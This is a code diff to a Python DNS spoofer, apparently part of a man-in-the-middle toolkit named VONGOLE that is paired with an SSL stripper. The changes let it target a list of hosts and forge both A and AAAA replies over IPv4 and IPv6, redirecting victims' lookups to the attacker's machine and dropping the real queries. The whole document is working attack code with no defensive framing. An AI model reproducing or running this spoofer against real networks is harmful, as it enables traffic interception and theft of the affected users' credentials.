@@ -1,5 +1,6 @@
 import logging
 from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, get_if_addr
+from scapy.layers.inet6 import IPv6
 import threading
 import time
 
@@ -18,16 +19,18 @@ except ImportError:
 class DNSSpoofer:
     """DNS spoofer that integrates with SSL stripper for transparent MITM"""
 
-    def __init__(self, interface, target_ip, dns_mapping=None, packet_handler=None):
+    def __init__(self, interface, target_ips, dns_mapping=None, packet_handler=None, verbose=False):
         self.interface = interface
-        self.target_ip = target_ip
+        self.target_ips = target_ips
         self.packet_handler = packet_handler
         self.running = False
         self.spoofed_count = 0
         self.spoofed_count = 0
+        self.verbose = verbose
 
         # Get our IP from the interface
         self.attacker_ip = self._get_interface_ip()
+        self.attacker_ipv6 = self._get_interface_ipv6()
 
         # Default domains to spoof (well this is just what im using for tests rnow)
         self.spoof_domains = dns_mapping or {
@@ -42,7 +45,10 @@ class DNSSpoofer:
         }
 
         logger.info(
-            f"DNS Spoofer initialized - redirecting to {self.attacker_ip}")
+            f"DNS Spoofer initialized - redirecting to {self.attacker_ip} (IPv4)")
+
+        if self.attacker_ipv6:
+            logger.info(f"IPv6 address: {self.attacker_ipv6}")
 
     # TODO: rip DRY
     def _get_interface_ip(self):
@@ -71,6 +77,24 @@ class DNSSpoofer:
                                 return a.address
             return None
 
+    def _get_interface_ipv6(self):
+        try:
+            import socket
+            import psutil
+            for name, addrs in psutil.net_if_addrs().items():
+                if name == self.interface:
+                    for a in addrs:
+                        if a.family == socket.AF_INET6:
+                            if not a.address.startswith('fe80'):
+                                return a.address
+                    # Return link-local if thats all we have
+                    for a in addrs:
+                        if a.family == socket.AF_INET6:
+                            return a.address
+        except:
+            pass
+        return None
+
     def start(self):
         """Start DNS spoofing"""
         if not self.packet_handler:
@@ -87,10 +111,17 @@ class DNSSpoofer:
         self.packet_handler.add_filter(self._dns_filter, priority=100)
 
         logger.info("[VONGOLE] DNS Spoofing active")
-        print(
-            f"{Fore.CYAN}DNS Spoofer: Redirecting domains to {self.attacker_ip}{Style.RESET_ALL}")
-        print(
-            f"{Fore.YELLOW}Spoofed domains: {', '.join(self.spoof_domains.keys())}{Style.RESET_ALL}")
+
+        if self.verbose:
+            logger.info(
+                f"DNS Spoofer: Redirecting domains to {self.attacker_ip}")
+
+            if self.attacker_ipv6:
+                logger.info(f"IPv6 redirecting to: {self.attacker_ipv6}")
+
+            logger.info(
+                f"Spoofed domains: {', '.join(self.spoof_domains.keys())}")
+            logger.info(f"Target IPs: {', '.join(self.target_ips)}")
 
         return True
 
@@ -101,22 +132,30 @@ class DNSSpoofer:
             f"DNS Spoofer stopped - spoofed {self.spoofed_count} queries")
 
     def _dns_filter(self, packet):
-        """Process DNS queries and inject fake responses"""
+        """Process DNS queries and inject fake responses - NOW WITH IPv6"""
         try:
-            # Check if it's a DNS query
+            # Check if it's a DNS query (works for both IPv4 and IPv6)
             if (packet.haslayer(DNS) and
                 packet[DNS].qr == 0 and  # Query, not response
-                packet.haslayer(IP) and
                 packet.haslayer(UDP) and
                     packet[UDP].dport == 53):  # DNS port
 
-                # Only process queries from target
-                if packet[IP].src != self.target_ip:
+                # NEW: Check source IP for both IPv4 and IPv6
+                src_ip = None
+                if packet.haslayer(IP):
+                    src_ip = packet[IP].src
+                elif packet.haslayer(IPv6):
+                    src_ip = packet[IPv6].src
+
+                # Check if from one of our targets (now a list)
+                if src_ip not in self.target_ips:
                     return False
 
                 # Get queried domain
                 if packet.haslayer(DNSQR):
                     qname = packet[DNSQR].qname
+                    qtype = packet[DNSQR].qtype  # NEW: Check query type
+
                     if isinstance(qname, bytes):
                         domain = qname.decode('utf-8').rstrip('.')
                     else:
@@ -130,30 +169,87 @@ class DNSSpoofer:
                             break
 
                     if spoof_ip:
-                        print(
-                            f"\n{Fore.GREEN}[VONGOLE] DNS SPOOFING: {domain} -> {spoof_ip}{Style.RESET_ALL}")
-                        self.spoofed_count += 1
+                        if qtype == 1:  # A record (IPv4)
+                            if self.verbose:
+                                logger.info(
+                                    f"[VONGOLE] DNS SPOOFING (A): {domain} -> {spoof_ip}")
+                            self.spoofed_count += 1
 
-                        # Create spoofed DNS response
-                        dns_reply = IP(dst=packet[IP].src, src=packet[IP].dst) / \
-                            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
-                            DNS(
-                            id=packet[DNS].id,
-                            qr=1,               # This is a response
-                            aa=1,               # Authoritative answer
-                            qd=packet[DNS].qd,  # Copy the question
-                            an=DNSRR(
-                                rrname=packet[DNSQR].qname,
-                                type='A',
-                                ttl=300,
-                                rdata=spoof_ip
-                            )
-                        )
+                            # Create IPv4 response
+                            if packet.haslayer(IP):
+                                dns_reply = IP(dst=packet[IP].src, src=packet[IP].dst) / \
+                                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
+                                    DNS(
+                                        id=packet[DNS].id,
+                                        qr=1,
+                                        aa=1,
+                                        qd=packet[DNS].qd,
+                                        an=DNSRR(
+                                            rrname=packet[DNSQR].qname,
+                                            type='A',
+                                            ttl=300,
+                                            rdata=spoof_ip
+                                        )
+                                )
+                            else:  # IPv6 transport
+                                dns_reply = IPv6(dst=packet[IPv6].src, src=packet[IPv6].dst) / \
+                                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
+                                    DNS(
+                                        id=packet[DNS].id,
+                                        qr=1,
+                                        aa=1,
+                                        qd=packet[DNS].qd,
+                                        an=DNSRR(
+                                            rrname=packet[DNSQR].qname,
+                                            type='A',
+                                            ttl=300,
+                                            rdata=spoof_ip
+                                        )
+                                )
+
+                        # AAAA record (IPv6)
+                        elif qtype == 28 and self.attacker_ipv6:
+                            if self.verbose:
+                                logger.info(
+                                    f"[VONGOLE] DNS SPOOFING (AAAA): {domain} -> {self.attacker_ipv6}")
+                            self.spoofed_count += 1
+
+                            # Create IPv6 response
+                            if packet.haslayer(IP):
+                                dns_reply = IP(dst=packet[IP].src, src=packet[IP].dst) / \
+                                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
+                                    DNS(
+                                        id=packet[DNS].id,
+                                        qr=1,
+                                        aa=1,
+                                        qd=packet[DNS].qd,
+                                        an=DNSRR(
+                                            rrname=packet[DNSQR].qname,
+                                            type='AAAA',
+                                            ttl=300,
+                                            rdata=self.attacker_ipv6
+                                        )
+                                )
+                            else:  # IPv6 transport
+                                dns_reply = IPv6(dst=packet[IPv6].src, src=packet[IPv6].dst) / \
+                                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
+                                    DNS(
+                                        id=packet[DNS].id,
+                                        qr=1,
+                                        aa=1,
+                                        qd=packet[DNS].qd,
+                                        an=DNSRR(
+                                            rrname=packet[DNSQR].qname,
+                                            type='AAAA',
+                                            ttl=300,
+                                            rdata=self.attacker_ipv6
+                                        )
+                                )
+                        else:
+                            return False  # Don't spoof other query types
 
                         send(dns_reply, iface=self.interface, verbose=0)
-
-                        # Drop the original query so it doesnt reach the real DNS server
-                        return True
+                        return True  # Drop original query
 
         except Exception as e:
             logger.debug(f"DNS filter error: {e}")
